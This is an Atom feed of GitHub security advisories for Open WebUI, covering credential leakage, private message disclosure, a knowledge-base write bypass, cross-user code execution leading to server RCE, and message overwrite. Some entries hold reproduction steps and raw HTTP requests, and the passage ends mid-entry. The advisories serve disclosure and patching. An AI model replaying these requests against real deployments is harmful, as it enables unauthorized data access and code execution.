<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2026-07-24T18:09:37.318Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: /api/v1/channels/{id}/members exposes full user model including sensitive credentials]]></title>
        <id>https://github.com/advisories/GHSA-gh7p-78x6-jw6m</id>
        <link href="https://github.com/advisories/GHSA-gh7p-78x6-jw6m"/>
        <updated>2026-07-24T17:04:56.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The channel members endpoint serializes and returns <strong>full user models</strong> for channel participants, including settings objects. A normal user in a DM can retrieve admin-only sensitive configuration such as webhook URLs and tool server key material (<code>settings.ui.toolServers[].key</code>), which is not available via standard user info APIs.</p>
<h3 id="details">Details</h3>
<p>The endpoint GET <code>/api/v1/channels/{id}/members</code> returns the full serialized user model for every member in the channel. In both the DM and non-DM code paths, the handler constructs the response with <code>[UserModelResponse(**user.model_dump(), is_active=...)]</code> and returns it as the users list. Because <code>UserModel</code> (<code>models/users.py</code>) includes a settings object (<code>UserSettings</code>) and arbitrary UI configuration (<code>settings.ui</code>), the endpoint exposes other users' sensitive configuration to any channel participant.</p>
<p>Practically, a regular user who participates in a DM or group can call <code>/api/v1/channels/{id}/members</code> and receive other members' settings, including admin-only details such as webhook notification URLs and tool server configuration, including credential fields like <code>settings.ui.toolServers[].key</code>. These values are not returned by the normal user profile endpoints (e.g., <code>/api/v1/users/{user_id}/info</code>).</p>
<h3 id="poc">PoC</h3>
<ol>
<li>Start a local Open WebUI instance</li>
<li>Log in as admin and in the Admin Panel, go to Settings -&gt; General and check <em>Channels (Beta)</em>, then press Save.</li>
<li>Create a low-privilege user in the Users tab</li>
<li>Click on the admin's profile bottom left, Settings and Integrations. Then click the <code>+</code> after <em>Manage Tool Servers</em> to add some tool server with a secret Bearer token (eg. <code>KEY</code>)</li>
<li>Log in as the attacker with the low-privilege account and create a new Direct Message channel with the admin user:</li>
</ol>
<img width="690" height="383" alt="image" src="https://github.com/user-attachments/assets/70208661-a0db-4457-9984-119056ca3daf">

<ol start="7">
<li>After creating, open DevTools with F12 and go to the Network tab. Then in the DM UI click on the <em>Users</em> icon top right to see the members. In the network tab, this should have triggered a <code>/api/v1/channels/{id}/members</code> request which responds with the <code>settings</code> key including <code>toolServers</code> and <code>key</code> values:</li>
</ol>
<img width="1642" height="577" alt="image" src="https://github.com/user-attachments/assets/6639d982-a156-4e8b-861e-587d86d9b152">

<p>The attacker has now leaked the admin's bearer token for the toolserver they configured.</p>
<h3 id="impact">Impact</h3>
<p>Conditions for exploit: channels are enabled and an attacker has a low-privilege account.</p>
<p>Webhook URLs and tool server configurations (including bearer keys) can be exfiltrated from any user.</p>
<h3 id="original-agent-report">Original Agent Report</h3>
<img width="400" alt="app aikido dev_ai-pentests_projects_116389_assessments_019d67d4-81c8-7dd2-bb9e-0a4a774b2c78_issues_sidebarIssue=20440423 (4)" src="https://github.com/user-attachments/assets/8415553a-9f1e-4f73-929c-aa0d18a101ca">
### References

<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-gh7p-78x6-jw6m">https://github.com/open-webui/open-webui/security/advisories/GHSA-gh7p-78x6-jw6m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59222">https://nvd.nist.gov/vuln/detail/CVE-2026-59222</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/fbcdcf146b99b5002705060a8243eee769108f9e">https://github.com/open-webui/open-webui/commit/fbcdcf146b99b5002705060a8243eee769108f9e</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0">https://github.com/open-webui/open-webui/releases/tag/v0.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-gh7p-78x6-jw6m">https://github.com/advisories/GHSA-gh7p-78x6-jw6m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gh7p-78x6-jw6m</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-24T17:04:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Private channel messages can be disclosed through cross-channel thread parent_id binding]]></title>
        <id>https://github.com/advisories/GHSA-73x5-h92w-xc2j</id>
        <link href="https://github.com/advisories/GHSA-73x5-h92w-xc2j"/>
        <updated>2026-07-24T17:04:32.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>A normal authenticated user can read the content of a message in a private channel they do not belong to. <code>GET /api/v1/channels/{id}/messages/{message_id}/thread</code> authorizes the caller against the URL channel, but the underlying thread lookup loads the thread <em>parent</em> by id and returns it without verifying the parent belongs to that channel. By requesting a thread in a channel they can access while supplying a victim channel's message id as the thread root, the attacker receives the victim message — content, channel id, and author.</p>
<h2 id="affected-component">Affected component</h2>
<ul>
<li><code>backend/open_webui/models/messages.py</code> — <code>get_messages_by_parent_id()</code></li>
<li><code>backend/open_webui/routers/channels.py</code> — <code>get_channel_thread_messages()</code> (read), <code>new_message_handler()</code> (parent/reply binding on write)</li>
</ul>
<h2 id="root-cause">Root cause</h2>
<p><code>get_messages_by_parent_id(channel_id, parent_id)</code> filters the thread <em>replies</em> by <code>channel_id</code>, but loads the thread <em>parent</em> by id alone and appends it without requiring <code>parent.channel_id == channel_id</code>:</p>
<pre><code class="language-python">message = await db.get(Message, parent_id)     # loaded by id only — no channel binding
if not message:
    return []
# replies are filtered by channel_id ...
if len(all_messages) &lt; limit:
    all_messages.append(message)               # parent appended unconditionally
</code></pre>
<p><code>get_channel_thread_messages()</code> authorizes only the URL channel, then calls <code>get_messages_by_parent_id(id, message_id)</code> with the caller-supplied <code>message_id</code>. The reply insert path (<code>new_message_handler</code> → <code>insert_new_message</code>) also stored a caller-supplied <code>parent_id</code> without binding it to the channel.</p>
<h2 id="impact">Impact</h2>
<p>A non-member can disclose the content (plus channel id and author metadata) of a private-channel message whose id they know or obtain. Direct reads of the victim channel/message/thread return 403; the disclosure is via the thread parent of a channel the attacker can access. Read-only, one message per known id.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>(reporter) Validated on v0.9.6: <code>GET /channels/{attacker_channel}/messages/{victim_message_id}/thread</code> returned the victim's private message — content, victim channel id, and author — although direct reads of the victim channel returned 403.</p>
<h2 id="fix">Fix</h2>
<p>Bind the thread parent to the requested channel: <code>get_messages_by_parent_id</code> returns <code>[]</code> unless the parent exists and <code>parent.channel_id == channel_id</code>. Defence-in-depth on the write path: <code>new_message_handler</code> rejects a supplied <code>parent_id</code>/<code>reply_to_id</code> whose message does not belong to the URL channel.</p>
<h2 id="affected--patched">Affected / Patched</h2>
<ul>
<li>Affected: <code>&lt; 0.10.0</code> (last affected release 0.9.6)</li>
<li>Patched: v0.10.0 (PR #25766). <code>get_messages_by_parent_id</code> binds the thread parent to the requested channel (returns <code>[]</code> unless <code>parent.channel_id == channel_id</code>), and <code>new_message_handler</code> rejects a caller-supplied <code>parent_id</code>/<code>reply_to_id</code> whose message does not belong to the channel.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-73x5-h92w-xc2j">https://github.com/open-webui/open-webui/security/advisories/GHSA-73x5-h92w-xc2j</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59215">https://nvd.nist.gov/vuln/detail/CVE-2026-59215</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/25766">https://github.com/open-webui/open-webui/pull/25766</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/a66477b7104c5d141ce7bffaea424b43e7666ef1">https://github.com/open-webui/open-webui/commit/a66477b7104c5d141ce7bffaea424b43e7666ef1</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0">https://github.com/open-webui/open-webui/releases/tag/v0.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-73x5-h92w-xc2j">https://github.com/advisories/GHSA-73x5-h92w-xc2j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-73x5-h92w-xc2j</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-07-24T17:04:31.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Cross-user model-list exposure via static cache key in get_all_models (aiocache key= vs key_builder= misuse)]]></title>
        <id>https://github.com/advisories/GHSA-3wp3-xxj9-5jqq</id>
        <link href="https://github.com/advisories/GHSA-3wp3-xxj9-5jqq"/>
        <updated>2026-07-24T17:03:22.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>The <code>get_all_models</code> handlers in <code>routers/openai.py</code> and <code>routers/ollama.py</code> intended to cache their <strong>permission-filtered</strong> model lists per user, but the <code>@cached</code> decorator was misconfigured: it passed a <code>key=</code> lambda instead of <code>key_builder=</code>. In aiocache 0.12.3 (the pinned version), <code>key=</code> is a <strong>static</strong> cache key — a callable passed there is used as a constant object, not invoked per call. As a result the per-user key was never computed, and all callers collided onto a single shared cache entry within the TTL window. During that window, one user's permission-filtered model list could be served to a different authenticated user, crossing the per-user authorization boundary.</p>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Boundary crossed:</strong> Confidentiality (cross-user). A caller can receive the model list scoped to a <em>different</em> security principal than themselves.</li>
<li>A user (or admin, or — depending on endpoint reachability — anonymous caller) who populates the cache causes the next caller within the TTL to receive <em>that</em> list rather than their own permission-filtered one.</li>
<li>What's disclosed is the set of models another principal can access, including potentially the existence and naming of models restricted from the receiving user.</li>
<li>Exposure is <strong>incidental and timing-dependent</strong>, not attacker-controlled: the leaked entry is whatever the most recent caller populated within <code>MODELS_CACHE_TTL</code> (default 1 second), and the attacker cannot select the victim or force a target's list into the cache.</li>
</ul>
<h2 id="affected-component">Affected component</h2>
<ul>
<li><code>backend/open_webui/routers/openai.py</code> — <code>get_all_models</code> (~line 488)</li>
<li><code>backend/open_webui/routers/ollama.py</code> — <code>get_all_models</code> (~line 302)</li>
</ul>
<p>Both decorated with <code>@cached(ttl=MODELS_CACHE_TTL, key=lambda ...)</code>. No other <code>@cached(... key=lambda ...)</code> misuse was found elsewhere in the backend.</p>
<h2 id="root-cause">Root cause</h2>
<p>aiocache 0.12's <code>@cached</code> treats <code>key=</code> as a static key; the per-call hook is <code>key_builder=</code> with signature <code>key_builder(func, *args, **kwargs)</code>. Passing a callable to <code>key=</code> uses the callable object itself as a constant key, so every invocation resolved to the same entry and the intended per-<code>user.id</code> namespacing never occurred.</p>
<h2 id="reproduction-default-config">Reproduction (default config)</h2>
<ol>
<li>On a default deployment, configure at least two users with <em>different</em> model-access permissions (e.g. one model restricted to user A).</li>
<li>As user A, request the model list (populates the shared cache entry).</li>
<li>Within <code>MODELS_CACHE_TTL</code> (default 1s), as user B, request the model list.</li>
<li>User B receives user A's permission-filtered list, including models B is not permitted to see.</li>
</ol>
<h2 id="remediation">Remediation</h2>
<p>Replace <code>key=</code> with <code>key_builder=</code> at both call sites and adjust the lambda to take the function as its first argument:</p>
<pre><code class="language-python">@cached(
    ttl=MODELS_CACHE_TTL,
    key_builder=lambda _func, request, user=None: (
        f'openai_all_models_{user.id}' if user else 'openai_all_models'
    ),
)
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-3wp3-xxj9-5jqq">https://github.com/open-webui/open-webui/security/advisories/GHSA-3wp3-xxj9-5jqq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59213">https://nvd.nist.gov/vuln/detail/CVE-2026-59213</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/25783">https://github.com/open-webui/open-webui/pull/25783</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/0fc630b34b2899599dabffffa012afd47599aa75">https://github.com/open-webui/open-webui/commit/0fc630b34b2899599dabffffa012afd47599aa75</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0">https://github.com/open-webui/open-webui/releases/tag/v0.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-3wp3-xxj9-5jqq">https://github.com/advisories/GHSA-3wp3-xxj9-5jqq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3wp3-xxj9-5jqq</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-07-24T17:03:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Upload `metadata.knowledge_id` bypasses the knowledge-base write-access check (read-only users can add files to KB)]]></title>
        <id>https://github.com/advisories/GHSA-7r7x-gjvr-448g</id>
        <link href="https://github.com/advisories/GHSA-7r7x-gjvr-448g"/>
        <updated>2026-07-24T17:02:15.000Z</updated>
        <content type="html"><![CDATA[<h1 id="open-webui-upload-metadata-can-add-files-to-knowledge-bases-without-write-permission">Open WebUI upload metadata can add files to knowledge bases without write permission</h1>
<h2 id="summary">Summary</h2>
<p>Open WebUI's file upload background processing trusts the client-supplied <code>metadata.knowledge_id</code> value and inserts a <code>knowledge_file</code> association before validating that the uploading user has write access to the target knowledge base.</p>
<p>A verified user with only read access to a knowledge base can upload an arbitrary file and set <code>metadata={"knowledge_id":"&lt;target knowledge id&gt;"}</code>. The normal <code>/api/v1/knowledge/{id}/file/add</code> endpoint correctly requires knowledge-base write access, but the upload auto-link path bypasses that authorization check.</p>
<p>The immediate result is unauthorized modification of the target knowledge base's file membership. The attached attacker-controlled file becomes visible through <code>/api/v1/knowledge/{id}/files</code>, and readers/owners of that knowledge base can retrieve the file through the normal file endpoints because file access is derived from <code>KnowledgeFile</code> membership.</p>
<h2 id="affected-version">Affected Version</h2>
<ul>
<li>Repository: <code>open-webui/open-webui</code></li>
<li>Tested source commit: <code>02dc3e689ceac915a870b373318b99c029ddf603</code></li>
<li>Package version observed in <code>package.json</code>: <code>0.9.6</code></li>
<li>Package name: <code>open-webui</code></li>
</ul>
<h2 id="impact">Impact</h2>
<p>A read-only knowledge-base collaborator can perform a write operation against that knowledge base by attaching arbitrary uploaded files.</p>
<p>Security impact:</p>
<ul>
<li>Unauthorized knowledge-base membership modification.</li>
<li>Integrity impact on shared knowledge-base file listings.</li>
<li>Attacker-controlled files become readable to other users who can read the target knowledge base.</li>
<li>If an owner/admin later reprocesses or globally reindexes the knowledge base, the unauthorized file can be indexed into the knowledge collection, turning the membership bypass into RAG/content poisoning.</li>
</ul>
<p>This is not an unauthenticated issue. It requires a verified Open WebUI account and a valid target knowledge-base ID. The clearest exploit path is a user who legitimately has read access to a knowledge base but not write access.</p>
<h2 id="source-evidence">Source Evidence</h2>
<p>The normal single-file knowledge add endpoint checks write permission before processing or inserting the relationship:</p>
<ul>
<li><code>backend/open_webui/routers/knowledge.py</code></li>
<li><code>add_file_to_knowledge_by_id</code></li>
<li>Lines 714-728 reject callers who are not owner, admin, or granted <code>write</code> access.</li>
<li>Lines 750-766 then process and insert the file only after that authorization gate.</li>
</ul>
<p>The upload auto-link path does not perform the same check:</p>
<ul>
<li><code>backend/open_webui/routers/files.py</code></li>
<li><code>process_uploaded_file</code></li>
<li>Lines 178-186 read <code>knowledge_id</code> from upload metadata and immediately call <code>Knowledges.add_file_to_knowledge_by_id(...)</code>.</li>
<li>Lines 187-192 call <code>process_file(... collection_name=knowledge_id ...)</code> after the insert.</li>
</ul>
<p>The model method inserts the relationship without validating the caller's write access to the knowledge base:</p>
<ul>
<li><code>backend/open_webui/models/knowledge.py</code></li>
<li><code>add_file_to_knowledge_by_id</code></li>
<li>Lines 646-677 create and commit a <code>KnowledgeFile</code> row for the supplied <code>knowledge_id</code>, <code>file_id</code>, and <code>user_id</code>.</li>
</ul>
<p>The later vector write check exists, but it runs too late:</p>
<ul>
<li><code>backend/open_webui/routers/retrieval.py</code></li>
<li><code>process_file</code></li>
<li>Lines 1587-1592 call <code>_validate_collection_access(..., access_type='write')</code> when a collection is supplied.</li>
</ul>
<p>Because the unauthorized <code>KnowledgeFile</code> row is already committed before that check runs, the failed vector processing does not undo the knowledge-base file association. The upload code catches the exception at <code>backend/open_webui/routers/files.py</code> lines 194-195 and logs a warning while leaving the row in place.</p>
<p>The unauthorized relationship affects file access decisions:</p>
<ul>
<li><code>backend/open_webui/utils/access_control/files.py</code></li>
<li><code>has_access_to_file</code></li>
<li>Lines 41-53 grant file access when a file is associated with a knowledge base the user can access.</li>
</ul>
<p>So once the attacker's file is inserted into the target <code>KnowledgeFile</code> table, target knowledge-base readers/owners can see and fetch that file through normal knowledge/file routes.</p>
<h2 id="reproduction-steps">Reproduction Steps</h2>
<p>Use a local Open WebUI instance with two verified users:</p>
<ol>
<li>As user <code>owner</code>, create a knowledge base.</li>
<li>Grant user <code>reader</code> read access to the knowledge base, but do not grant write access.</li>
<li>As <code>reader</code>, confirm the normal add-file endpoint is blocked:</li>
</ol>
<pre><code class="language-http">POST /api/v1/knowledge/&lt;knowledge_id&gt;/file/add
Authorization: Bearer &lt;reader token&gt;
Content-Type: application/json

{"file_id":"&lt;reader-owned-file-id&gt;"}
</code></pre>
<p>Expected and observed behavior for the normal route: it rejects the request because <code>reader</code> lacks knowledge-base write access.</p>
<ol start="4">
<li>As <code>reader</code>, upload a new file with the same target knowledge ID embedded in upload metadata:</li>
</ol>
<pre><code class="language-http">POST /api/v1/files/?process=true&amp;process_in_background=false
Authorization: Bearer &lt;reader token&gt;
Content-Type: multipart/form-data

file=@attacker-note.txt
metadata={"knowledge_id":"&lt;knowledge_id&gt;"}
</code></pre>
<ol start="5">
<li>Observe that the upload request succeeds and returns the uploaded file record.</li>
<li>As <code>owner</code>, request the knowledge-base files:</li>
</ol>
<pre><code class="language-http">GET /api/v1/knowledge/&lt;knowledge_id&gt;/files
Authorization: Bearer &lt;owner token&gt;
</code></pre>
<ol start="7">
<li>Observe that <code>attacker-note.txt</code> appears in the target knowledge base even though <code>reader</code> did not have write access.</li>
<li>As <code>owner</code>, request the file content:</li>
</ol>
<pre><code class="language-http">GET /api/v1/files/&lt;attacker_file_id&gt;/content
Authorization: Bearer &lt;owner token&gt;
</code></pre>
<ol start="9">
<li>Observe that the file is retrievable because <code>has_access_to_file</code> derives access from the unauthorized knowledge-base membership.</li>
</ol>
<h2 id="expected-behavior">Expected Behavior</h2>
<p>The upload auto-link path should enforce the same authorization contract as <code>/api/v1/knowledge/{id}/file/add</code>:</p>
<ul>
<li>The target knowledge base must exist.</li>
<li>The caller must be the knowledge owner, an admin, or have <code>write</code> access.</li>
<li>The supplied <code>directory_id</code>, if present, must belong to the target knowledge base.</li>
<li>The <code>KnowledgeFile</code> association should only be inserted after authorization and processing succeed.</li>
</ul>
<h2 id="actual-behavior">Actual Behavior</h2>
<p><code>metadata.knowledge_id</code> causes <code>Knowledges.add_file_to_knowledge_by_id(...)</code> to insert a <code>KnowledgeFile</code> row before write authorization is checked. The later collection write validation can fail, but the unauthorized membership row remains committed.</p>
<h2 id="suggested-fix">Suggested Fix</h2>
<p>Move knowledge-base authorization before the insert in the upload auto-link path. The upload path should share the same write-access and directory validation logic used by the dedicated knowledge endpoints.</p>
<p>One safe pattern:</p>
<ol>
<li>Load the target knowledge base.</li>
<li>Require owner/admin/write access before calling <code>Knowledges.add_file_to_knowledge_by_id</code>.</li>
<li>Validate that <code>directory_id</code>, if supplied, belongs to the same knowledge base.</li>
<li>Run vector processing before inserting the membership row, or wrap processing plus insertion in a transaction/compensating cleanup so a denied or failed process cannot leave a stale unauthorized row.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-7r7x-gjvr-448g">https://github.com/open-webui/open-webui/security/advisories/GHSA-7r7x-gjvr-448g</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59217">https://nvd.nist.gov/vuln/detail/CVE-2026-59217</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/26001">https://github.com/open-webui/open-webui/pull/26001</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/b7626f05fb92b24ab923ad81a037071ebd5623d1">https://github.com/open-webui/open-webui/commit/b7626f05fb92b24ab923ad81a037071ebd5623d1</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0">https://github.com/open-webui/open-webui/releases/tag/v0.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-7r7x-gjvr-448g">https://github.com/advisories/GHSA-7r7x-gjvr-448g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7r7x-gjvr-448g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-07-24T17:02:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Cross-user code-interpreter and tool execution via unvalidated Socket.IO event-caller session_id]]></title>
        <id>https://github.com/advisories/GHSA-74h3-cxq7-vc5q</id>
        <link href="https://github.com/advisories/GHSA-74h3-cxq7-vc5q"/>
        <updated>2026-07-24T17:01:54.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>An authenticated low-privilege user can execute arbitrary code-interpreter Python and tools inside <strong>another</strong> user's authenticated session. The Socket.IO event-caller (<code>get_event_call</code>) delivers <code>execute:python</code> / <code>execute:tool</code> events to a <strong>client-supplied</strong> <code>session_id</code> after only checking that the session is connected, never that it belongs to the requester. Combined with <code>ydoc:document:join</code>, which exposes the live socket ids of everyone in a shared note's collaboration room to any read-access participant, an attacker can target a victim's session and run attacker-chosen code/tools in the victim's browser context. When the victim is an administrator, that hijacked context reaches the admin-only Functions API, whose source is executed server-side, yielding remote code execution as the server process (root in the default container).</p>
<h2 id="affected-component">Affected component</h2>
<ul>
<li><code>backend/open_webui/socket/main.py</code> — <code>get_event_call()</code> / <code>__event_caller__</code></li>
<li><code>backend/open_webui/main.py</code> — chat-completion metadata (<code>session_id</code> taken from the request body)</li>
</ul>
<h2 id="root-cause">Root cause</h2>
<p>The event-caller routes to a caller-controlled session id with no ownership check:</p>
<pre><code class="language-python"># backend/open_webui/socket/main.py — get_event_call()
async def __event_caller__(event_data):
    session_id = request_info['session_id']
    if session_id not in SESSION_POOL:                 # only checks the session is connected
        return {'error': 'Client session disconnected.'}
    return await sio.call('events', {...}, to=session_id, ...)   # delivered to that sid
</code></pre>
<p><code>session_id</code> originates from the request body and is never validated against the authenticated user:</p>
<pre><code class="language-python"># backend/open_webui/main.py
metadata = {
    'user_id': user.id,                               # server-derived (trustworthy)
    'session_id': form_data.pop('session_id', None),  # client-controlled
    ...
}
</code></pre>
<p><code>SESSION_POOL[session_id]</code> is the user record of whoever owns that socket. Because the caller checks only membership (<code>in SESSION_POOL</code>), a request carrying another user's <code>session_id</code> causes <code>execute:python</code> / <code>execute:tool</code> to be delivered to that other user's browser.</p>
<h2 id="reachability">Reachability</h2>
<ul>
<li><code>execute:python</code> / <code>execute:tool</code> are emitted from the code-interpreter and tool-call paths (<code>utils/middleware.py</code>, <code>tools/builtin.py</code>), all routed through <code>get_event_call</code>.</li>
<li>The victim's live <code>session_id</code> is disclosed to any read-access participant of a shared note via <code>ydoc:document:join</code>.</li>
<li><code>POST /api/v1/chat/completions</code> requires only <code>get_verified_user</code> (the default user role). The attacker uses their own account and a model / Direct Connection they control to choose the payload.</li>
</ul>
<h2 id="impact">Impact</h2>
<ul>
<li><strong>Any victim:</strong> arbitrary code-interpreter Python and tool execution in the victim's authenticated session — the attacker acts with the victim's identity and origin (full session/account compromise).</li>
<li><strong>Admin victim:</strong> the hijacked admin context reaches <code>POST /api/v1/functions/create</code>, whose source is <code>exec()</code>'d server-side → remote code execution as the server process (root in the default container).</li>
</ul>
<p>The Functions API is intended administrator code-execution; the vulnerability here is the cross-user delivery that lets an attacker drive another user's session — including an admin's — into it. The primitive is a full session compromise even against non-admin victims.</p>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>The reporter's <code>exploit.py</code> reproduced on <code>ghcr.io/open-webui/open-webui:0.9.6</code> and a build of the <code>v0.9.6</code> tag, confirming blind server-side RCE out-of-band (callback returns <code>uid=0(root)</code>), using only a low-privilege <code>user</code> account that shared a note with an admin victim. Preconditions: code interpreter enabled; attacker shares a note with the victim; victim opens it while online; admin victim required for server RCE.</p>
<h2 id="fix">Fix</h2>
<p><code>get_event_call</code> must verify the target session belongs to the requesting user before delivering, not merely that it is connected:</p>
<pre><code class="language-python">session = SESSION_POOL.get(session_id)
if session is None or session.get('id') != request_info.get('user_id'):
    return {'error': 'Client session disconnected.'}
</code></pre>
<p><code>user_id</code> in the request metadata is server-derived from the authenticated user, so it is trustworthy. Restricting <code>ydoc:document:join</code> so it does not disclose other participants' socket ids is recommended as defence-in-depth.</p>
<h2 id="affected--patched">Affected / Patched</h2>
<ul>
<li>Affected: <code>&lt; 0.10.0</code> (last affected release 0.9.6)</li>
<li>Patched: v0.10.0. <code>get_event_call</code> now verifies the target session belongs to the requesting user before delivering (<code>session is None or session.get('id') != request_info.get('user_id')</code>), using the server-derived <code>user_id</code> from the request metadata. The recommended <code>ydoc:document:join</code> sid-disclosure restriction is defence-in-depth and independent of this fix; the ownership check closes the cross-user delivery regardless of whether the victim's sid is known.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/open-webui/open-webui/security/advisories/GHSA-74h3-cxq7-vc5q">https://github.com/open-webui/open-webui/security/advisories/GHSA-74h3-cxq7-vc5q</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-59216">https://nvd.nist.gov/vuln/detail/CVE-2026-59216</a></li>
<li><a href="https://github.com/open-webui/open-webui/pull/25763">https://github.com/open-webui/open-webui/pull/25763</a></li>
<li><a href="https://github.com/open-webui/open-webui/commit/386ac958144dbbbf0aa6e268070d72b681a318aa">https://github.com/open-webui/open-webui/commit/386ac958144dbbbf0aa6e268070d72b681a318aa</a></li>
<li><a href="https://github.com/open-webui/open-webui/releases/tag/v0.10.0">https://github.com/open-webui/open-webui/releases/tag/v0.10.0</a></li>
<li><a href="https://github.com/advisories/GHSA-74h3-cxq7-vc5q">https://github.com/advisories/GHSA-74h3-cxq7-vc5q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-74h3-cxq7-vc5q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T17:01:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[open-webui] Open WebUI: Cross-channel message overwrite via chat completion API (single-model and multimodel message_ids)]]></title>
        <id>https://github.com/advisories/GHSA-x2ff-v5v8-m75m</id>
        <link href="https://github.com/advisories/GHSA-x2ff-v5v8-m75m"/>
        <updated>2026-07-24T17:01:08.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Any authenticated user can overwrite the content of a message in a channel they do not belong to (including private and DM channels) by sending a chat completion request with a <code>channel:</code>-prefixed <code>chat_id</code> and a target <code>message_id</code>. The <code>channel:</code> path routes pipeline output through <code>_make_channel_emitter</code>, which writes to the <code>Messages</code> table using the caller-supplied <code>message_id</code> without binding it to the channel.</p>
<p>This advisory consolidates two filings of the same flaw: the original single-model form, and a multimodel <code>message_ids</code> variant that survives the partial fix shipped in v0.9.6 (see "Fix status" below).</p>
<h2 id="details-as-introduced-in-v095">Details (as introduced in v0.9.5)</h2>
<p>When a user submits a chat completion request with a <code>chat_id</code> starting with <code>channel:</code>, three authorization gaps combined in v0.9.5:</p>
<ol>
<li><strong>Ownership check skipped</strong> (<code>main.py</code>): the <code>channel:</code> prefix caused the entire ownership/membership verification block to be skipped, with no channel membership/write check replacing it.</li>
</ol>
<pre><code class="language-python">if not chat_id.startswith('local:') and not chat_id.startswith('channel:'):  # temporary/channel chats are not stored
    if is_new_chat:
        ...
    else:
        if not await Chats.is_chat_owner(chat_id, user.id) and user.role != 'admin':
            raise HTTPException(...)
</code></pre>
<ol start="2">
<li><p><strong>Message ID from user input</strong>: <code>id</code> (and each value of the multimodel <code>message_ids</code> map) comes directly from the request body and is passed as <code>message_id</code> to the channel emitter.</p>
</li>
<li><p><strong>Unchecked database write</strong> (<code>socket/main.py</code> <code>_make_channel_emitter</code>):</p>
</li>
</ol>
<pre><code class="language-python">async def _make_channel_emitter(request_info):
    channel_id = request_info['chat_id'].removeprefix('channel:')
    message_id = request_info['message_id']  # user-supplied
    ...
    await Messages.update_message_by_id(message_id, update_form)  # no channel/user authz
</code></pre>
<p><code>Messages.update_message_by_id</code> performs a direct primary-key update with no <code>channel_id</code>/<code>user_id</code> validation.</p>
<h2 id="fix-shipped-in-v0100">Fix (shipped in v0.10.0)</h2>
<p>v0.9.6 added a channel gate to the <code>channel:</code> branch (PR #24725) that closed the single-model path, but it validated only the first entry of the multimodel <code>message_ids</code> map, leaving the multimodel fan-out exploitable. v0.10.0 closes the remaining gap with two layers:</p>
<ol>
